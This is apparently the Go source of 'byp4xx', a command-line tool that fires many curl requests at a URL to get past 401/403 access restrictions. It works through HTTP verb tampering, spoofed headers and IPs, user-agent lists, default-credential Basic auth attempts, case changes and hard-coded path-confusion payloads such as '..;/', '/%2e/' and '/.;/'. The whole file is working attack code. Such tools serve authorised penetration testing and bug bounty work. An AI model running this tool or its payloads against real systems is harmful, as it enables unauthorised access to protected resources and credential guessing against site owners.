package main

import (
	"fmt"
	"os"
	"regexp"
	"os/exec"
	"strconv" 
	"strings"
	"bufio"
	"sync"
	"time"
	b64 "encoding/base64"
)

//Global vars 
var maxThreads int = 1
var wg sync.WaitGroup
var queue int = 0
var verbose = false
var rateLimit = 5
var rateBoolean = true
var sem = make(chan int, maxThreads)
var lastPart, previousParts string
var xV,xH,xUA,xX,xD,xS,xM,xE,xB = false, false, false, false, false, false, false, false, false


func main() {
	//Show that banner!
	//banner()

	// Check if the number of arguments is less than 1
	if len(os.Args) == 1 {
		fmt.Println("byp4xx <cURL or byp4xx options> <URL or file>")

		fmt.Println("Some cURL options you may use as example:")
		fmt.Println("  -L follow redirections (30X responses)")
		fmt.Println("  -x <ip>:<port> to set a proxy")
		fmt.Println("  -m <seconds> to set a timeout")
		fmt.Println("  -H for new headers. Escape double quotes.")
		fmt.Println("  -d for data in the POST requests body")
		fmt.Println("  -...")
  
		fmt.Println("Built-in options:")
		fmt.Println("  --all Verbose mode")
		fmt.Println("  -t or --thread Set the maximum threads")
		fmt.Println("  --rate Set the maximum reqs/sec. Only one thread enforced, for low rate limits.")
		fmt.Println("  -xV Exclude verb tampering")
		fmt.Println("  -xH Exclude headers")
		fmt.Println("  -xUA Exclude User-Agents")
		fmt.Println("  -xX Exclude extensions")
		fmt.Println("  -xD Exclude default creds")
		fmt.Println("  -xS Exclude CaSe SeNsiTiVe")
		fmt.Println("  -xM Exclude middle paths")
		fmt.Println("  -xE Exclude end paths")
		fmt.Println("  -xB Exclude #bugbountytips")
		os.Exit(0)
	}

	// Get the last argument as the URL
	url := os.Args[len(os.Args)-1]

	options := os.Args[1 : len(os.Args)-1]
	
	//check for rate limit
	for i, option := range options {
		if option == "--rate" {
			if i+1 < len(options) {
				rate, _ := strconv.Atoi(options[i+1])
				rateLimit = rate
				maxThreads = 1
				sem = make(chan int, maxThreads)
				options = append(options[:i], options[i+2:]...)
			}
			
		} 
	}
	
	// check for the -t or --thread argument to set the max number of threads
	for i, option := range options {
		if option == "-t" || option == "--thread" {
			if i+1 < len(options) {
				threads, _ := strconv.Atoi(options[i+1])
				maxThreads = threads
				sem = make(chan int, maxThreads)
				//Delete -t/--thread and the value from options
				options = append(options[:i], options[i+2:]...)
				rateBoolean = false
			}
			
		} 
	}
	
	// check for verbose --all
	for i, option := range options {
		if option == "--all" {
			verbose = true
			options = append(options[:i], options[i+1:]...)
		}
	}
	
	//Check for exclusions
	for i := 0 ; i < len(options); i++ {
		option := options[i]
		if option == "-xV" {
			xV = true
			options = append(options[:i], options[i+1:]...)
			i--			
		}else if option == "-xH" {
			xH = true
			options = append(options[:i], options[i+1:]...)
			i--	
		}else if option == "-xUA" {
			xUA = true
			options = append(options[:i], options[i+1:]...)
			i--	
		}else if option == "-xX" {
			xX = true
			options = append(options[:i], options[i+1:]...)
			i--	
		}else if option == "-xD" {
			xD = true
			options = append(options[:i], options[i+1:]...)
			i--	
		}else if option == "-xS" {
			xS = true
			options = append(options[:i], options[i+1:]...)
			i--	
		}else if option == "-xM" {
			xM = true
			options = append(options[:i], options[i+1:]...)
			i--	
		}else if option == "-xE" {
			xE = true
			options = append(options[:i], options[i+1:]...)
			i--	
		}else if option == "-xB" {
			xB = true
			options = append(options[:i], options[i+1:]...)
			i--	
		}			
	}	

	// Check if the URL is valid
	match, _ := regexp.MatchString("^https?://", url)
	
	if match {
		byp4xx(options, url)
	} else {
		// check if the file exists
		if _, err := os.Stat(url); os.IsNotExist(err) {
			fmt.Println("File not found")
			os.Exit(1)
		}

		// read the file and check each line
		file, err := os.Open(url)
		if err != nil {
			fmt.Println("Error reading file:", err)
			os.Exit(1)
		}
		defer file.Close()
		
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			line := scanner.Text()
			match, _ := regexp.MatchString("^https?://", line)
			if match {
				byp4xx(options, line)
			} else {
				fmt.Println("Invalid URL in file:", line)
			}
		}
	}
}

func curl_code_response(message string, options []string, url string) {
        
	// Append the options and the URL to the curl command
	codeOptions := []string{"-k","-s","-o","/dev/null","-w","\"%{http_code}\""}
	payload := append(options,url)
	payload = append(codeOptions,payload...)
	curlCommand := exec.Command("curl",payload...)

	// Execute the command and get the output
	output, _ := curlCommand.CombinedOutput()
	outputStr := strings.ReplaceAll(string(output), "\"", "")
	code,_ := strconv.Atoi(outputStr)
        if code >= 200 && code < 300 {
                outputStr = ""+outputStr+""
                fmt.Println(message, outputStr)
        } else if code >= 300 && code < 400 {
                outputStr = ""+outputStr+""
                fmt.Println(message, outputStr)
        } else {
        	if verbose {
	                outputStr = ""+outputStr+""
        		fmt.Println(message, outputStr)
                }
        }
	if rateBoolean {
		rateLimit_mod := 1.0 / float64(rateLimit) * 1000.0
		time.Sleep(time.Duration(rateLimit_mod) * time.Millisecond)
	}
        defer wg.Done()

}


func byp4xx(options []string, url string) {

	//Parse the URL
	if strings.HasSuffix(url, "/") {
		parts := strings.Split(strings.TrimRight(url, "/"), "/")
		lastPart = parts[len(parts)-1]
		lastPart = lastPart+"/"
		previousParts = strings.Join(parts[:len(parts)-1], "/")
	} else {
		parts := strings.Split(url, "/")
		lastPart = parts[len(parts)-1]
		previousParts = strings.Join(parts[:len(parts)-1], "/")
	}

	//Run modules
	fmt.Println("===== "+url+" =====")
	if !xV {
	verbTampering(options,url)
	}
	if !xH {
	headers(options,url)
	}
	if !xUA {
	userAgent(options,url)
	} 
	if !xX {
	extensions(options,url)
	}
	if !xD {
	defaultCreds(options,url)
	}
	if !xS {
	caseSensitive(options,url)
	}
	if !xM {
	midPaths(options,url)
	}
	if !xE {
	endPaths(options,url)	
	}
	if !xB {
	bugBounty(options,url)	
	}
	
}

func verbTampering(options []string, url string) {
	fmt.Println("==VERB TAMPERING==")	
	//VERB TAMPERING
	file, _ := os.Open("/TIP/info_scan/40Xbypass/templates/verbs.txt")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		sem <- 1
		wg.Add(1)
       		go func(){
       			options_mod := append(options,"-X",line)
        		curl_code_response(line+":", options_mod, url)
        		<-sem
       		 }()
	}
	wg.Wait()
}

func headers(options []string, url string) {
	//HEADERS + IP
	fmt.Println("==HEADERS==")
	file, _ := os.Open("/TIP/info_scan/40Xbypass/templates/headers.txt")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		file2, _ := os.Open("/TIP/info_scan/40Xbypass/templates/ip.txt")
		defer file2.Close()
		scanner2 := bufio.NewScanner(file2)
		for scanner2.Scan() {
			line := scanner.Text()
			line2 := scanner2.Text()
			sem <- 1
			wg.Add(1)
       			go func(){
       				line = line+line2
       				options_mod := append(options,"-H",line)
        			curl_code_response(line+":", options_mod, url)
        			<-sem
       			 }()
       		}
	}
	wg.Wait()
}

func userAgent(options []string, url string) {
	//USER AGENT
	fmt.Println("==USER AGENTS==")
	file, _ := os.Open("/TIP/info_scan/40Xbypass/templates/UserAgents.txt")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		sem <- 1
		wg.Add(1)
       		go func(){
       			line = "User-Agent: "+line
       			options_mod := append(options,"-H",line)
        		curl_code_response(line+":", options_mod, url)
        		<-sem
       		 }()
	}
	wg.Wait()
}

func extensions(options []string, url string) {
	//EXTENSIONS
	fmt.Println("==EXTENSIONS==")
	file, _ := os.Open("/TIP/info_scan/40Xbypass/templates/extensions.txt")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		sem <- 1
		wg.Add(1)
       		go func(){
       			url_mod := url+line
        		curl_code_response(line+":", options, url_mod)
        		<-sem
       		}()
	}
	wg.Wait()
}

func defaultCreds(options []string, url string) {
	//DEFAULT CREDS
	fmt.Println("==DEFAULT CREDS==")
	file, _ := os.Open("/TIP/info_scan/40Xbypass/templates/defaultcreds.txt")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		sem <- 1
		wg.Add(1)
       		go func(){
       			creds := line
	       		sEnc := b64.StdEncoding.EncodeToString([]byte(line))
    			line = "Authorization: Basic "+sEnc
       			options_mod := append(options,"-H",line)
        		curl_code_response(creds+":", options_mod, url)
        		<-sem
       		 }()
	}
	wg.Wait()
}

func caseSensitive(options []string, url string) {
	//Case sensitive
	
	fmt.Println("==CASE SENSITIVE==")
	for i := range lastPart{
		modifiedUri := ""
		for j, r := range lastPart{
			if j == i {
				if r >= 'A' && r <= 'Z' {
					modifiedUri += string(r + ('a' - 'A'))
				} else if r >= 'a' && r <= 'z' {
					modifiedUri += string(r - ('a' - 'A'))
				}
			} else {
				modifiedUri += string(r)
			}
		}
		sem <- 1
		wg.Add(1)
       		go func(){
       			url_mod := previousParts+"/"+modifiedUri
        		curl_code_response(modifiedUri+":", options, url_mod)
        		<-sem
       		 }()
	}
	wg.Wait()
}

func midPaths(options []string, url string) {
	//MID PATHS
	fmt.Println("==MID PATHS==")
	file, _ := os.Open("/TIP/info_scan/40Xbypass/templates/midpaths.txt")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		sem <- 1
		wg.Add(1)
       		go func(){
       	       		options_mod := append(options,"--path-as-is")	
       			url_mod := previousParts+"/"+line+"/"+lastPart
        		curl_code_response(line+":", options_mod, url_mod)
        		<-sem
       		 }()
	}
	wg.Wait()
}

func endPaths(options []string, url string) {
	//END PATHS
	fmt.Println("==END PATHS==")
	file, _ := os.Open("/TIP/info_scan/40Xbypass/templates/endpaths.txt")
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		sem <- 1
		wg.Add(1)
       		go func(){
       	       		options_mod := append(options,"--path-as-is")	
       			url_mod := previousParts+"/"+lastPart+line
        		curl_code_response(line+":", options_mod, url_mod)
        		<-sem
       		 }()
	}
	wg.Wait()
}

func bugBounty(options []string, url string) {

	//BUG BOUNTY
	fmt.Println("==BUG BOUNTY TIPS==")
	wg.Add(1)
	sem <- 1
       	go func(){
       		url_mod := previousParts+"/%2e/"+lastPart
        	curl_code_response("/%2e/"+lastPart+":", options, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		url_mod := previousParts+"/%ef%bc%8f"+lastPart
   		options_mod := append(options,"--path-as-is")
        	curl_code_response("/%ef%bc%8f"+lastPart+":", options_mod, url_mod)
        	<-sem
       	}()
       	
       	/*wg.Add(1)
       	sem <- 1
       	go func(){
       		options_mod := append(options,"--path-as-is")
       		url_mod := previousParts+"/%ef%bc%8f"+lastPart+"/."
        	curl_code_response("/%ef%bc%8f"+lastPart+"/.:", options_mod, url_mod)
        	<-sem
       	}()*/
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		url_mod := previousParts+"/"+lastPart+"?"
        	curl_code_response("/"+lastPart+"?:", options, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		url_mod := previousParts+"/"+lastPart+"??"
        	curl_code_response("/"+lastPart+"??:", options, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		url_mod := previousParts+"/"+lastPart+"//"
        	curl_code_response("/"+lastPart+"//:", options, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		url_mod := previousParts+"/"+lastPart+"/"
        	curl_code_response("/"+lastPart+"/:", options, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		options_mod := append(options,"--path-as-is")
       		url_mod := previousParts+"/./"+lastPart+"/./"
        	curl_code_response("/./"+lastPart+"/./:", options_mod, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		url_mod := previousParts+"/"+lastPart+"/.randomstring"
        	curl_code_response("/"+lastPart+"/.randomstring:", options, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		options_mod := append(options,"--path-as-is")
       		url_mod := previousParts+"/"+lastPart+"..;/"
        	curl_code_response("/"+lastPart+"..;/:", options_mod, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		options_mod := append(options,"--path-as-is")
       		url_mod := previousParts+"/"+lastPart+"..;"
        	curl_code_response("/"+lastPart+"..;:", options_mod, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		options_mod := append(options,"--path-as-is")
       		url_mod := previousParts+"/.;/"+lastPart
        	curl_code_response("/.;/"+lastPart+":", options_mod, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		options_mod := append(options,"--path-as-is")
       		url_mod := previousParts+"/.;/"+lastPart+"/.;/"
        	curl_code_response("/.;/"+lastPart+"/.;/:", options_mod, url_mod)
        	<-sem
       	}()
       	wg.Add(1)
       	sem <- 1
       	go func(){
       		options_mod := append(options,"--path-as-is")
       		url_mod := previousParts+"/;foo=bar/"+lastPart
        	curl_code_response("/;foo=bar/"+lastPart+":", options_mod, url_mod)
        	<-sem
       	}()
       	wg.Wait()  
}
